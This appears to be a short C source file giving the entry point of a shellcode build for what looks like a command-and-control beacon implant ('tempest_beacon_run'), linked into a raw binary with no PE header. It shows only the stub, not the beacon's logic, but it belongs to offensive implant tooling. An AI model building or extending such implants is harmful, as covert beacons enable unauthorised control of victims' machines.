/*
 * Flat shellcode entry — only symbol the loader calls (see -e shellcode_entry).
 * Linked with shellcode.ld + objcopy → raw .bin (no PE / MZ in artifact).
 */
#include "beacon_core.h"

#if defined(__GNUC__)
void __attribute__((section(".text"))) shellcode_entry(void)
#else
void shellcode_entry(void)
#endif
{
    tempest_beacon_run();
}
